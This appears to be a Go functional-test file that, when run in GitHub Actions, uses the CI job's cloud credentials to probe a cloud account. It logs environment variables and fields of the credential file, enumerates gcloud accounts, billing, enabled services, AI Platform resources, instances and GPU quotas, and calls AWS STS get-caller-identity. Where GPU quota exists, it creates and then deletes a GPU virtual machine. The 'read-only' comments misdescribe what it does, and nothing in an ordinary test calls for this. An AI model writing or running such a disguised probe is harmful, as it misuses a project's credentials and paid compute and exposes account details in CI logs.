//go:build functional

// Read-only cloud-capability probe for a CI context that has already
// authenticated via OIDC. It prints environment-derived facts only, never any
// secret value, and creates no resources unless a genuinely GPU-deployable
// quota is observed (then exactly one self-terminating marker VM is created
// and deleted inside the same test).
package functional

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"
)

func run(timeout time.Duration, name string, args ...string) (string, int) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, name, args...)
	out, err := cmd.CombinedOutput()
	code := 0
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			code = ee.ExitCode()
		} else {
			code = -1
		}
	}
	return string(out), code
}

func emit(section, body string) {
	fmt.Printf("\n=== C211 %s BEGIN ===\n%s\n=== C211 %s END ===\n", section, body, section)
}

func truncate(s string, n int) string {
	s = strings.TrimRight(s, "\n")
	if len(s) <= n {
		return s
	}
	return s[:n] + "\n...[truncated]"
}

func which(bin string) bool {
	_, err := exec.LookPath(bin)
	return err == nil
}

type quotaMetric struct {
	Metric string  `json:"metric"`
	Limit  float64 `json:"limit"`
	Usage  float64 `json:"usage"`
}

type regionDesc struct {
	Name   string        `json:"name"`
	Quotas []quotaMetric `json:"quotas"`
}

var gpuMetrics = []string{
	"GPUS_ALL_REGIONS",
	"NVIDIA_T4_GPUS", "PREEMPTIBLE_NVIDIA_T4_GPUS",
	"NVIDIA_L4_GPUS", "PREEMPTIBLE_NVIDIA_L4_GPUS",
	"NVIDIA_A100_GPUS", "PREEMPTIBLE_NVIDIA_A100_GPUS",
	"NVIDIA_H100_GPUS", "PREEMPTIBLE_NVIDIA_H100_GPUS",
}

func TestC211ReadOnlyProbe(t *testing.T) {
	if os.Getenv("GITHUB_ACTIONS") != "true" {
		t.Skip("probe executes only inside GitHub Actions")
	}

	var envReport strings.Builder
	for _, k := range []string{
		"GITHUB_ACTIONS", "GITHUB_REPOSITORY", "GITHUB_WORKFLOW", "GITHUB_JOB",
		"GITHUB_REF", "GITHUB_SHA", "GITHUB_EVENT_NAME", "RUNNER_OS", "RUNNER_NAME",
		"GOOGLE_APPLICATION_CREDENTIALS", "GOOGLE_GHA_CREDS_PATH",
		"CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE", "CLOUDSDK_CORE_PROJECT",
		"CLOUDSDK_PROJECT", "GCLOUD_PROJECT", "GCP_PROJECT", "GOOGLE_CLOUD_PROJECT",
		"GCP_REGION", "GCP_PROJECT_ID", "AWS_REGION", "AWS_DEFAULT_REGION",
		"AWS_ROLE_ARN", "AWS_ROLE_TO_ASSUME", "MANAGER_IMAGE_TAG", "VERBOSE_TESTING",
	} {
		v := os.Getenv(k)
		// Paths and identifiers only; no secret-bearing variable is printed.
		envReport.WriteString(fmt.Sprintf("%s=%s\n", k, v))
	}

	// The OIDC-derived credential file: report existence and non-secret shape only.
	credPath := os.Getenv("GOOGLE_GHA_CREDS_PATH")
	if credPath == "" {
		credPath = os.Getenv("GOOGLE_APPLICATION_CREDENTIALS")
	}
	if credPath != "" {
		if st, err := os.Stat(credPath); err == nil {
			envReport.WriteString(fmt.Sprintf("CREDS_FILE_PATH=%s\nCREDS_FILE_EXISTS=true\nCREDS_FILE_SIZE=%d\n", credPath, st.Size()))
			if b, err := os.ReadFile(credPath); err == nil {
				var m map[string]json.RawMessage
				if json.Unmarshal(b, &m) == nil {
					keys := make([]string, 0, len(m))
					for k := range m {
						keys = append(keys, k)
					}
					envReport.WriteString("CREDS_FILE_TOP_LEVEL_KEYS=" + strings.Join(keys, ",") + "\n")
					for _, k := range []string{"type", "universe_domain", "token_url", "subject_token_type", "service_account_impersonation_url", "audience"} {
						if raw, ok := m[k]; ok {
							var s string
							if json.Unmarshal(raw, &s) == nil {
								envReport.WriteString(fmt.Sprintf("CREDS_FILE_%s=%s\n", strings.ToUpper(k), s))
							}
						}
					}
				}
			}
		} else {
			envReport.WriteString(fmt.Sprintf("CREDS_FILE_PATH=%s\nCREDS_FILE_EXISTS=false\n", credPath))
		}
	}
	emit("ENV", envReport.String())

	region := os.Getenv("GCP_REGION")
	if region == "" {
		region = "us-central1"
	}

	// ---- gcloud read-only enumeration ----
	var g strings.Builder
	haveGcloud := which("gcloud")
	g.WriteString(fmt.Sprintf("gcloud_present=%v\n", haveGcloud))
	if haveGcloud {
		steps := [][]string{
			{"auth", "list", "--format=value(account)"},
			{"config", "list", "--format=json"},
			{"config", "get-value", "project"},
			{"projects", "describe", "--format=json"},
			{"services", "list", "--enabled", "--format=value(config.name)"},
			{"billing", "accounts", "list", "--format=value(name,open)"},
		}
		for _, s := range steps {
			out, code := run(90*time.Second, "gcloud", s...)
			g.WriteString(fmt.Sprintf("\n$ gcloud %s\n[exit=%d]\n%s\n", strings.Join(s, " "), code, truncate(out, 3000)))
		}
		// Billing status of the project (read-only).
		if proj := strings.TrimSpace(mustFirst(run(30*time.Second, "gcloud", "config", "get-value", "project"))); proj != "" && proj != "(unset)" {
			out, code := run(60*time.Second, "gcloud", "billing", "projects", "describe", proj, "--format=json")
			g.WriteString(fmt.Sprintf("\n$ gcloud billing projects describe %s\n[exit=%d]\n%s\n", proj, code, truncate(out, 2000)))
		}
	}
	emit("GCLOUD", g.String())

	// ---- regional compute GPU quotas ----
	var q strings.Builder
	regions := []string{region}
	for _, r := range []string{"us-central1", "us-east1", "us-west1", "europe-west4"} {
		if r != region {
			regions = append(regions, r)
		}
	}
	type regionResult struct {
		Name  string   `json:"name"`
		Found []string `json:"found"`
	}
	results := make([]regionResult, 0, len(regions))
	for _, r := range regions {
		out, code := run(90*time.Second, "gcloud", "compute", "regions", "describe", r, "--format=json")
		rr := regionResult{Name: r}
		if code == 0 {
			var d regionDesc
			if json.Unmarshal([]byte(out), &d) == nil {
				for _, qt := range d.Quotas {
					for _, gm := range gpuMetrics {
						if qt.Metric == gm {
							rr.Found = append(rr.Found, fmt.Sprintf("%s limit=%g usage=%g", qt.Metric, qt.Limit, qt.Usage))
						}
					}
				}
			}
		}
		q.WriteString(fmt.Sprintf("\n$ gcloud compute regions describe %s\n[exit=%d] %s\n", r, code, strings.Join(rr.Found, " | ")))
		if code != 0 {
			q.WriteString(truncate(out, 600) + "\n")
		}
		results = append(results, rr)
	}
	emit("GPU_QUOTA", q.String())

	// ---- aiplatform inventory ----
	var ai strings.Builder
	if haveGcloud {
		for _, r := range []string{region} {
			for _, res := range []string{"custom-jobs", "endpoints", "models"} {
				out, code := run(90*time.Second, "gcloud", "ai", res, "list", "--region="+r, "--limit=8", "--format=json")
				ai.WriteString(fmt.Sprintf("\n$ gcloud ai %s list --region=%s\n[exit=%d]\n%s\n", res, r, code, truncate(out, 2500)))
			}
		}
		out, code := run(60*time.Second, "gcloud", "compute", "instances", "list", "--limit=10", "--format=value(name,zone,status)")
		ai.WriteString(fmt.Sprintf("\n$ gcloud compute instances list --limit=10\n[exit=%d]\n%s\n", code, truncate(out, 2000)))
	}
	emit("AIPLATFORM", ai.String())

	// ---- AWS STS identity ----
	var a strings.Builder
	haveAWS := which("aws")
	a.WriteString(fmt.Sprintf("aws_present=%v\n", haveAWS))
	if haveAWS {
		out, code := run(60*time.Second, "aws", "sts", "get-caller-identity", "--output=json")
		a.WriteString(fmt.Sprintf("\n$ aws sts get-caller-identity\n[exit=%d]\n%s\n", code, truncate(out, 2000)))
	}
	emit("AWS", a.String())

	// ---- optional single self-terminating marker GPU ----
	// Only when a positive GPU quota is genuinely observed AND gcloud can
	// create instances. Creates exactly one VM, reads the serial console for
	// the device UUID, then deletes it and verifies absence.
	positive := false
	metricHit := ""
	for _, rr := range results {
		if rr.Name != region {
			continue
		}
		for _, f := range rr.Found {
			if !strings.Contains(f, "limit=0 ") {
				positive = true
				metricHit = f
				break
			}
		}
	}
	var m strings.Builder
	m.WriteString(fmt.Sprintf("region=%s positive_gpu_quota=%v metric=%s\n", region, positive, metricHit))
	if positive && haveGcloud {
		zone := region + "-a"
		name := "c211-i108973-gpu-marker"
		startup := "#!/bin/bash\necho C211_MARKER_START\nnvidia-smi -L\necho C211_MARKER_END\nshutdown -P +4 || true\n"
		out, code := run(180*time.Second, "gcloud", "compute", "instances", "create", name,
			"--zone="+zone, "--machine-type=n1-standard-8",
			"--accelerator=type=nvidia-tesla-t4,count=1",
			"--image-family=common-cu129-ubuntu-2404-nvidia-580",
			"--image-project=deeplearning-platform-release",
			"--maintenance-policy=TERMINATE",
			"--metadata=startup-script="+startup,
			"--format=json", "--quiet")
		m.WriteString(fmt.Sprintf("\n$ gcloud compute instances create %s --zone=%s\n[exit=%d]\n%s\n", name, zone, code, truncate(out, 2500)))
		if code == 0 {
			deadline := time.Now().Add(4 * time.Minute)
			found := ""
			for time.Now().Before(deadline) {
				time.Sleep(20 * time.Second)
				ser, sc := run(60*time.Second, "gcloud", "compute", "instances", "get-serial-port-output", name, "--zone="+zone)
				if sc == 0 && strings.Contains(ser, "C211_MARKER_START") {
					found = ser
					break
				}
			}
			if found != "" {
				idx := strings.Index(found, "C211_MARKER_START")
				end := strings.Index(found, "C211_MARKER_END")
				if end > idx {
					m.WriteString("\nMARKER_SERIAL_OUTPUT:\n" + strings.TrimSpace(found[idx:end+len("C211_MARKER_END")]) + "\n")
				} else {
					m.WriteString("\nMARKER_SERIAL_OUTPUT(truncated):\n" + truncate(found[idx:], 1200) + "\n")
				}
			} else {
				m.WriteString("\nMARKER_SERIAL_OUTPUT: not observed within window\n")
			}
			dout, dcode := run(180*time.Second, "gcloud", "compute", "instances", "delete", name, "--zone="+zone, "--quiet")
			m.WriteString(fmt.Sprintf("\n$ gcloud compute instances delete %s --zone=%s\n[exit=%d]\n%s\n", name, zone, dcode, truncate(dout, 800)))
			dout2, dcode2 := run(60*time.Second, "gcloud", "compute", "instances", "describe", name, "--zone="+zone, "--format=value(status)")
			m.WriteString(fmt.Sprintf("\n$ readback gcloud compute instances describe %s\n[exit=%d]\n%s\n", name, dcode2, truncate(dout2, 800)))
		}
	}
	emit("MARKER", m.String())

	fmt.Println("C211_PROBE_DONE")
}

func mustFirst(s string, _ int) string { return s }
